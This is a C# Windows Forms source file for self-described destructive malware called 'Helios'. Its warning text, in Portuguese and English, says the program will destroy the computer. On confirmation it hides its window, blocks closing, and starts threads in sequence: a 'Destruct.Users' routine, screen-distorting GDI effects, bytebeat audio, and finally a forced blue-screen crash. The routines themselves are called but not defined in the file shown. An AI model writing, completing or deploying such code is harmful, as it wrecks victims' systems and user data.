using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Gdi32;
using static Vanara.PInvoke.Gdi32.RasterOperationMode;
using System.Windows.Forms;
using Vanara.PInvoke;
using System.Threading;
using System.Threading.Tasks;

namespace Helios
{
    public partial class Form1: Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        private void button2_Click(object sender, EventArgs e)
        {
            Thread gdi1 = new Thread(GDI.GDI1);
            Thread gdi2 = new Thread(GDI.GDI2);
            Thread gdi3 = new Thread(GDI.GDI3);
            Thread gdi4 = new Thread(GDI.GDI4);
            Thread gdi5 = new Thread(GDI.GDI5);
            Thread payload1 = new Thread(GDI.Payload1);
            Thread byte1 = new Thread(ByteBeat.ByteBeat1);
            Thread byte2 = new Thread(ByteBeat.ByteBeat2);
            Thread byte3 = new Thread(ByteBeat.ByteBeat3);
            Thread byte4 = new Thread(ByteBeat.ByteBeat4);
            Thread destruct1 = new Thread(Destruct.Users);
            Thread mouseicon = new Thread(GDI.MouseIcon);
            Thread BlueScreen = new Thread(Destruct.BSOD);

            this.Hide();
            destruct1.Start();
            Sleep(3000);
            payload1.Start();
            mouseicon.Start();
            byte1.Start();
            gdi1.Start();
            Sleep(10000);
            byte1.Abort();
            byte2.Start();
            gdi2.Start();
            Sleep(9000);
            byte2.Abort();
            byte3.Start();
            gdi3.Start();
            Sleep(11000);
            gdi4.Start();
            Sleep(10000);
            gdi4.Abort();
            gdi3.Abort();
            GDI.LimparEfeitos();
            GDI.LimparEfeitos();
            GDI.LimparEfeitos();
            byte3.Abort();
            byte4.Start();
            gdi5.Start();
            Sleep(10000);
            BlueScreen.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            label1.Text = "AVISO: ISSO É UM MALWARE QUE IRA DESTRUIR \r\nCOMPLETAMENTE SEU COMPUTADOR O CRIADOR NÃO SE \r\nRESPONSABILIZA POR NADA QUER MESMO EXECUTAR?\r\n";
            button1.Text = "Não";
            button2.Text = "Sim";
        }

        private void button4_Click(object sender, EventArgs e)
        {
            label1.Text = "WARNING: THIS IS MALWARE THAT WILL COMPLETELY \r\nDESTROY YOUR COMPUTER. THE CREATOR IS NOT \r\nRESPONSIBLE FOR ANYTHING. DO YOU REALLY\r\n WANT TO RUN IT?\r\n";
            button1.Text = "No";
            button2.Text = "Yes";
        }
    }
}
